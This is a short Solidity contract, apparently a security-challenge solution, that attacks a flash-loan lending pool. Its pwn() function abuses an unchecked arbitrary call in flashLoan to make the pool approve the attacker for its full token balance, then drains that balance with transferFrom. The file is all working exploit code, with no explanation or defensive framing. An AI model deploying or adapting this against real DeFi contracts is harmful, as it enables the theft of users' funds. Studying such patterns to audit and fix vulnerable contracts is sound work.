// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {IERC20} from "sce/sol/IERC20.sol";

interface ILendingPool {
    function token() external view returns (address);
    function flashLoan(uint256 amount, address target, bytes calldata data)
        external;
}

contract LendingPoolExploit {
    ILendingPool public pool;
    IERC20 public token;

    constructor(address _pool) {
        pool = ILendingPool(_pool);
        token = IERC20(pool.token());
    }

    function pwn() external {
        // this function will be called
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(0, address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), amount));
        token.transferFrom(address(pool), address(this), amount);
    }
}